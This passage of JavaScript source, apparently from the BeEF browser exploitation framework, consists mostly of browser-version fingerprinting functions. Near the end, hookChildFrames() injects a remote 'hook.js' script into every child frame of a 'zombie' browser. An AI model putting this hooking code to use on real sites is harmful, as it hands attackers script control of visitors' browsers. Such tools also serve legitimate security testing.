     * Returns true if Chrome for iOS 30.
     * @example: beef.browser.isC30iOS()
     */
    isC30iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome 31.
     * @example: beef.browser.isC31()
     */
    isC31: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 31.
     * @example: beef.browser.isC31iOS()
     */
    isC31iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome 32.
     * @example: beef.browser.isC32()
     */
    isC32: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 32.
     * @example: beef.browser.isC32iOS()
     */
    isC32iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome 33.
     * @example: beef.browser.isC33()
     */
    isC33: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 33.
     * @example: beef.browser.isC33iOS()
     */
    isC33iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome 34.
     * @example: beef.browser.isC34()
     */
    isC34: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 34.
     * @example: beef.browser.isC34iOS()
     */
    isC34iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome 35.
     * @example: beef.browser.isC35()
     */
    isC35: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 35.
     * @example: beef.browser.isC35iOS()
     */
    isC35iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome 36.
     * @example: beef.browser.isC36()
     */
    isC36: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 36.
     * @example: beef.browser.isC36iOS()
     */
    isC36iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome 37.
     * @example: beef.browser.isC37()
     */
    isC37: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 37.
     * @example: beef.browser.isC37iOS()
     */
    isC37iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome 38.
     * @example: beef.browser.isC38()
     */
    isC38: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 38.
     * @example: beef.browser.isC38iOS()
     */
    isC38iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome 39.
     * @example: beef.browser.isC39()
     */
    isC39: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 39.
     * @example: beef.browser.isC39iOS()
     */
    isC39iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome 40.
     * @example: beef.browser.isC40()
     */
    isC40: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 40.
     * @example: beef.browser.isC40iOS()
     */
    isC40iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome 41.
     * @example: beef.browser.isC41()
     */
    isC41: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 41.
     * @example: beef.browser.isC41iOS()
     */
    isC41iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome 42.
     * @example: beef.browser.isC42()
     */
    isC42: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 42.
     * @example: beef.browser.isC42iOS()
     */
    isC42iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome 43.
     * @example: beef.browser.isC43()
     */
    isC43: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 43.
     * @example: beef.browser.isC43iOS()
     */
    isC43iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome 44.
     * @example: beef.browser.isC44()
     */
    isC44: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 44.
     * @example: beef.browser.isC44iOS()
     */
    isC44iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome 45.
     * @example: beef.browser.isC45()
     */
    isC45: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome 46.
     * @example: beef.browser.isC46()
     */
    isC46: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    isC47: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 45.
     * @example: beef.browser.isC45iOS()
     */
    isC45iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC: function () {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC46()  || this.isC47()|| this.isC45iOS();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO: function () {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

    /**
     * Returns a hash of string keys representing a given capability
     * @example: beef.browser.capabilities()["navigator.plugins"]
     */
    capabilities: function () {
        var out = {};
        var type = this.type();

        out["navigator.plugins"] = (type.IE11 || !type.IE);

        return out;
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type: function () {

        return {
            C5: this.isC5(), // Chrome 5
            C6: this.isC6(), // Chrome 6
            C7: this.isC7(), // Chrome 7
            C8: this.isC8(), // Chrome 8
            C9: this.isC9(), // Chrome 9
            C10: this.isC10(), // Chrome 10
            C11: this.isC11(), // Chrome 11
            C12: this.isC12(), // Chrome 12
            C13: this.isC13(), // Chrome 13
            C14: this.isC14(), // Chrome 14
            C15: this.isC15(), // Chrome 15
            C16: this.isC16(), // Chrome 16
            C17: this.isC17(), // Chrome 17
            C18: this.isC18(), // Chrome 18
            C19: this.isC19(), // Chrome 19
            C19iOS: this.isC19iOS(), // Chrome 19 on iOS
            C20: this.isC20(), // Chrome 20
            C20iOS: this.isC20iOS(), // Chrome 20 on iOS
            C21: this.isC21(), // Chrome 21
            C21iOS: this.isC21iOS(), // Chrome 21 on iOS
            C22: this.isC22(), // Chrome 22
            C22iOS: this.isC22iOS(), // Chrome 22 on iOS
            C23: this.isC23(), // Chrome 23
            C23iOS: this.isC23iOS(), // Chrome 23 on iOS
            C24: this.isC24(), // Chrome 24
            C24iOS: this.isC24iOS(), // Chrome 24 on iOS
            C25: this.isC25(), // Chrome 25
            C25iOS: this.isC25iOS(), // Chrome 25 on iOS
            C26: this.isC26(), // Chrome 26
            C26iOS: this.isC26iOS(), // Chrome 26 on iOS
            C27: this.isC27(), // Chrome 27
            C27iOS: this.isC27iOS(), // Chrome 27 on iOS
            C28: this.isC28(), // Chrome 28
            C28iOS: this.isC28iOS(), // Chrome 28 on iOS
            C29: this.isC29(), // Chrome 29
            C29iOS: this.isC29iOS(), // Chrome 29 on iOS
            C30: this.isC30(), // Chrome 30
            C30iOS: this.isC30iOS(), // Chrome 30 on iOS
            C31: this.isC31(), // Chrome 31
            C31iOS: this.isC31iOS(), // Chrome 31 on iOS
            C32: this.isC32(), // Chrome 32
            C32iOS: this.isC32iOS(), // Chrome 32 on iOS
            C33: this.isC33(), // Chrome 33
            C33iOS: this.isC33iOS(), // Chrome 33 on iOS
            C34: this.isC34(), // Chrome 34
            C34iOS: this.isC34iOS(), // Chrome 34 on iOS
            C35: this.isC35(), // Chrome 35
            C35iOS: this.isC35iOS(), // Chrome 35 on iOS
            C36: this.isC36(), // Chrome 36
            C36iOS: this.isC36iOS(), // Chrome 36 on iOS
            C37: this.isC37(), // Chrome 37
            C37iOS: this.isC37iOS(), // Chrome 37 on iOS
            C38: this.isC38(), // Chrome 38
            C38iOS: this.isC38iOS(), // Chrome 38 on iOS
            C39: this.isC39(), // Chrome 39
            C39iOS: this.isC39iOS(), // Chrome 39 on iOS
            C40: this.isC40(), // Chrome 40
            C40iOS: this.isC40iOS(), // Chrome 40 on iOS
            C41: this.isC41(), // Chrome 41
            C41iOS: this.isC41iOS(), // Chrome 41 on iOS
            C42: this.isC42(), // Chrome 42
            C42iOS: this.isC42iOS(), // Chrome 42 on iOS
            C43: this.isC43(), // Chrome 43
            C43iOS: this.isC43iOS(), // Chrome 43 on iOS
            C44: this.isC44(), // Chrome 44
            C44iOS: this.isC44iOS(), // Chrome 44 on iOS
            C45: this.isC45(), // Chrome 45
            C46: this.isC46(), // Chrome 46
            C47: this.isC47(), // Chrome 46
            C45iOS: this.isC45iOS(), // Chrome 45 on iOS

            C: this.isC(), // Chrome any version

            FF2: this.isFF2(), // Firefox 2
            FF3: this.isFF3(), // Firefox 3
            FF3_5: this.isFF3_5(), // Firefox 3.5
            FF3_6: this.isFF3_6(), // Firefox 3.6
            FF4: this.isFF4(), // Firefox 4
            FF5: this.isFF5(), // Firefox 5
            FF6: this.isFF6(), // Firefox 6
            FF7: this.isFF7(), // Firefox 7
            FF8: this.isFF8(), // Firefox 8
            FF9: this.isFF9(), // Firefox 9
            FF10: this.isFF10(), // Firefox 10
            FF11: this.isFF11(), // Firefox 11
            FF12: this.isFF12(), // Firefox 12
            FF13: this.isFF13(), // Firefox 13
            FF14: this.isFF14(), // Firefox 14
            FF15: this.isFF15(), // Firefox 15
            FF16: this.isFF16(), // Firefox 16
            FF17: this.isFF17(), // Firefox 17
            FF18: this.isFF18(), // Firefox 18
            FF19: this.isFF19(), // Firefox 19
            FF20: this.isFF20(), // Firefox 20
            FF21: this.isFF21(), // Firefox 21
            FF22: this.isFF22(), // Firefox 22
            FF23: this.isFF23(), // Firefox 23
            FF24: this.isFF24(), // Firefox 24
            FF25: this.isFF25(), // Firefox 25
            FF26: this.isFF26(), // Firefox 26
            FF27: this.isFF27(), // Firefox 27
            FF28: this.isFF28(), // Firefox 28
            FF29: this.isFF29(), // Firefox 29
            FF30: this.isFF30(), // Firefox 30
            FF31: this.isFF31(), // Firefox 31
            FF32: this.isFF32(), // Firefox 32
            FF33: this.isFF33(), // Firefox 33
            FF34: this.isFF34(), // Firefox 34
            FF35: this.isFF35(), // Firefox 35
            FF36: this.isFF36(), // Firefox 36
            FF37: this.isFF37(), // Firefox 37
            FF38: this.isFF38(), // Firefox 38
            FF39: this.isFF39(), // Firefox 39
            FF40: this.isFF40(), // Firefox 40
            FF41: this.isFF41(), // Firefox 41
            FF42: this.isFF42(), // Firefox 42
            FF43: this.isFF43(), // Firefox 43
            FF: this.isFF(),   // Firefox any version

            IE6: this.isIE6(), // Internet Explorer 6
            IE7: this.isIE7(), // Internet Explorer 7
            IE8: this.isIE8(), // Internet Explorer 8
            IE9: this.isIE9(), // Internet Explorer 9
            IE10: this.isIE10(), // Internet Explorer 10
            IE11: this.isIE11(), // Internet Explorer 11
            IE: this.isIE(), // Internet Explorer any version

            O9_52: this.isO9_52(), // Opera 9.50 through 9.52
            O9_60: this.isO9_60(), // Opera 9.60 through 9.64
            O10: this.isO10(), // Opera 10.xx
            O11: this.isO11(), // Opera 11.xx
            O12: this.isO12(), // Opera 12.xx
            O: this.isO(),   // Opera any version

            S4: this.isS4(), // Safari 4.xx
            S5: this.isS5(), // Safari 5.xx
            S6: this.isS6(), // Safari 6.x
            S7: this.isS7(), // Safari 7.x
            S8: this.isS8(), // Safari 8.x
            S: this.isS()   // Safari any version
        }
    },

    /**
     * Returns the type of browser being used.
     * @return: {String} User agent software and version.
     *
     * @example: beef.browser.getBrowserVersion()
     */
    getBrowserVersion: function () {

        if (this.isC5()) {
            return '5'
        }
        ; 	// Chrome 5
        if (this.isC6()) {
            return '6'
        }
        ; 	// Chrome 6
        if (this.isC7()) {
            return '7'
        }
        ; 	// Chrome 7
        if (this.isC8()) {
            return '8'
        }
        ; 	// Chrome 8
        if (this.isC9()) {
            return '9'
        }
        ; 	// Chrome 9
        if (this.isC10()) {
            return '10'
        }
        ; 	// Chrome 10
        if (this.isC11()) {
            return '11'
        }
        ; 	// Chrome 11
        if (this.isC12()) {
            return '12'
        }
        ; 	// Chrome 12
        if (this.isC13()) {
            return '13'
        }
        ; 	// Chrome 13
        if (this.isC14()) {
            return '14'
        }
        ; 	// Chrome 14
        if (this.isC15()) {
            return '15'
        }
        ; 	// Chrome 15
        if (this.isC16()) {
            return '16'
        }
        ;	// Chrome 16
        if (this.isC17()) {
            return '17'
        }
        ;	// Chrome 17
        if (this.isC18()) {
            return '18'
        }
        ;	// Chrome 18
        if (this.isC19()) {
            return '19'
        }
        ;	// Chrome 19
        if (this.isC19iOS()) {
            return '19'
        }
        ;   // Chrome 19 for iOS
        if (this.isC20()) {
            return '20'
        }
        ;	// Chrome 20
        if (this.isC20iOS()) {
            return '20'
        }
        ;   // Chrome 20 for iOS
        if (this.isC21()) {
            return '21'
        }
        ;	// Chrome 21
        if (this.isC21iOS()) {
            return '21'
        }
        ;   // Chrome 21 for iOS
        if (this.isC22()) {
            return '22'
        }
        ;    // Chrome 22
        if (this.isC22iOS()) {
            return '22'
        }
        ;   // Chrome 22 for iOS
        if (this.isC23()) {
            return '23'
        }
        ;    // Chrome 23
        if (this.isC23iOS()) {
            return '23'
        }
        ;   // Chrome 23 for iOS
        if (this.isC24()) {
            return '24'
        }
        ;    // Chrome 24
        if (this.isC24iOS()) {
            return '24'
        }
        ;   // Chrome 24 for iOS
        if (this.isC25()) {
            return '25'
        }
        ;    // Chrome 25
        if (this.isC25iOS()) {
            return '25'
        }
        ;   // Chrome 25 for iOS
        if (this.isC26()) {
            return '26'
        }
        ;    // Chrome 26
        if (this.isC26iOS()) {
            return '26'
        }
        ;   // Chrome 26 for iOS
        if (this.isC27()) {
            return '27'
        }
        ;    // Chrome 27
        if (this.isC27iOS()) {
            return '27'
        }
        ;   // Chrome 27 for iOS
        if (this.isC28()) {
            return '28'
        }
        ;    // Chrome 28
        if (this.isC28iOS()) {
            return '28'
        }
        ;   // Chrome 28 for iOS
        if (this.isC29()) {
            return '29'
        }
        ;    // Chrome 29
        if (this.isC29iOS()) {
            return '29'
        }
        ;   // Chrome 29 for iOS
        if (this.isC30()) {
            return '30'
        }
        ;    // Chrome 30
        if (this.isC30iOS()) {
            return '30'
        }
        ;   // Chrome 30 for iOS
        if (this.isC31()) {
            return '31'
        }
        ;   // Chrome 31
        if (this.isC31iOS()) {
            return '31'
        }
        ;   // Chrome 31 for iOS
        if (this.isC32()) {
            return '32'
        }
        ;   // Chrome 32
        if (this.isC32iOS()) {
            return '32'
        }
        ;   // Chrome 32 for iOS
        if (this.isC33()) {
            return '33'
        }
        ;   // Chrome 33
        if (this.isC33iOS()) {
            return '33'
        }
        ;   // Chrome 33 for iOS
        if (this.isC34()) {
            return '34'
        }
        ;   // Chrome 34
        if (this.isC34iOS()) {
            return '34'
        }
        ;   // Chrome 34 for iOS
        if (this.isC35()) {
            return '35'
        }
        ;   // Chrome 35
        if (this.isC35iOS()) {
            return '35'
        }
        ;   // Chrome 35 for iOS
        if (this.isC36()) {
            return '36'
        }
        ;   // Chrome 36
        if (this.isC36iOS()) {
            return '36'
        }
        ;   // Chrome 36 for iOS
        if (this.isC37()) {
            return '37'
        }
        ;   // Chrome 37
        if (this.isC37iOS()) {
            return '37'
        }
        ;   // Chrome 37 for iOS
        if (this.isC38()) {
            return '38'
        }
        ;   // Chrome 38
        if (this.isC38iOS()) {
            return '38'
        }
        ;   // Chrome 38 for iOS
        if (this.isC39()) {
            return '39'
        }
        ;   // Chrome 39
        if (this.isC39iOS()) {
            return '39'
        }
        ;   // Chrome 39 for iOS
        if (this.isC40()) {
            return '40'
        }
        ;   // Chrome 40
        if (this.isC40iOS()) {
            return '40'
        }
        ;   // Chrome 40 for iOS
        if (this.isC41()) {
            return '41'
        }
        ;   // Chrome 41
        if (this.isC41iOS()) {
            return '41'
        }
        ;   // Chrome 41 for iOS
        if (this.isC42()) {
            return '42'
        }
        ;   // Chrome 42
        if (this.isC42iOS()) {
            return '42'
        }
        ;   // Chrome 42 for iOS
        if (this.isC43()) {
            return '43'
        }
        ;   // Chrome 43
        if (this.isC43iOS()) {
            return '43'
        }
        ;   // Chrome 43 for iOS
        if (this.isC44()) {
            return '44'
        }
        ;   // Chrome 44
        if (this.isC44iOS()) {
            return '44'
        }
        ;   // Chrome 44 for iOS
        if (this.isC45()) {
            return '45'
        }
        ;   // Chrome 45
        if (this.isC46()) {
            return '46'
        }
        ;// Chrome 46
        if (this.isC47()) {
            return '47'
        }
        ;// Chrome 47
        if (this.isC45iOS()) {
            return '45'
        }
        ;   // Chrome 45 for iOS

        if (this.isFF2()) {
            return '2'
        }
        ;	// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;	// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;	// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;	// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;	// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;	// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;	// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;	// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;	// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;	// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;	// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;	// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;	// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;	// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;	// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;	// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;	// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;    // Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;    // Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;    // Firefox 19
        if (this.isFF20()) {
            return '20'
        }
        ;    // Firefox 20
        if (this.isFF21()) {
            return '21'
        }
        ;    // Firefox 21
        if (this.isFF22()) {
            return '22'
        }
        ;   // Firefox 22
        if (this.isFF23()) {
            return '23'
        }
        ;   // Firefox 23
        if (this.isFF24()) {
            return '24'
        }
        ;   // Firefox 24
        if (this.isFF25()) {
            return '25'
        }
        ;   // Firefox 25
        if (this.isFF26()) {
            return '26'
        }
        ;   // Firefox 26
        if (this.isFF27()) {
            return '27'
        }
        ;   // Firefox 27
        if (this.isFF28()) {
            return '28'
        }
        ;   // Firefox 28
        if (this.isFF29()) {
            return '29'
        }
        ;   // Firefox 29
        if (this.isFF30()) {
            return '30'
        }
        ;   // Firefox 30
        if (this.isFF31()) {
            return '31'
        }
        ;   // Firefox 31
        if (this.isFF32()) {
            return '32'
        }
        ;   // Firefox 32
        if (this.isFF33()) {
            return '33'
        }
        ;   // Firefox 33
        if (this.isFF34()) {
            return '34'
        }
        ;   // Firefox 34
        if (this.isFF35()) {
            return '35'
        }
        ;   // Firefox 35
        if (this.isFF36()) {
            return '36'
        }
        ;   // Firefox 36
        if (this.isFF37()) {
            return '37'
        }
        ;   // Firefox 37
        if (this.isFF38()) {
            return '38'
        }
        ;   // Firefox 38
        if (this.isFF39()) {
            return '39'
        }
        ;   // Firefox 39
        if (this.isFF40()) {
            return '40'
        }
        ;   // Firefox 40
        if (this.isFF41()) {
            return '41'
        }
        ;   // Firefox 41
        if (this.isFF42()) {
            return '42'
        }
        ;   // Firefox 42
        if (this.isFF43()) {
            return '43'
        }
        ;   // Firefox 43

        if (this.isIE6()) {
            return '6'
        }
        ;	// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;	// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;	// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;	// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;	// Internet Explorer 10
        if (this.isIE11()) {
            return '11'
        }
        ;   // Internet Explorer 11

        if (this.isS4()) {
            return '4'
        }
        ;	// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;	// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;	// Safari 6

        if (this.isS7()) {
            return '7'
        }
        ;	// Safari 7
        if (this.isS8()) {
            return '8'
        }
        ;       // Safari 8

        if (this.isO9_52()) {
            return '9.5'
        }
        ;	// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;	// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;	// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;	// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;	// Opera 12.xx

        return 'UNKNOWN';				// Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName: function () {

        if (this.isC()) {
            return 'C'
        }
        ; 	// Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;		// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;		// Internet Explorer any version
        if (this.isO()) {
            return 'O'
        }
        ;		// Opera any version
        if (this.isS()) {
            return 'S'
        }
        ;		// Safari any version
        return 'UNKNOWN';					// Unknown UA
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames: function () {

        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'http://google.com:80/hook.js';

        // loop through child frames
        for (var i = 0; i < self.frames.length; i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
            } catch (e) {
                // warn on cross-origin
                beef.debug("Hooking child frame failed: " + e.message);
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash: function () {
        if (!this.type().IE) {
            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
        } else {
            flash_versions = 12;
            flash_installed = false;


            if (this.type().IE11) {
                flash_installed = (navigator.plugins["Shockwave Flash"] != undefined);
            } else {
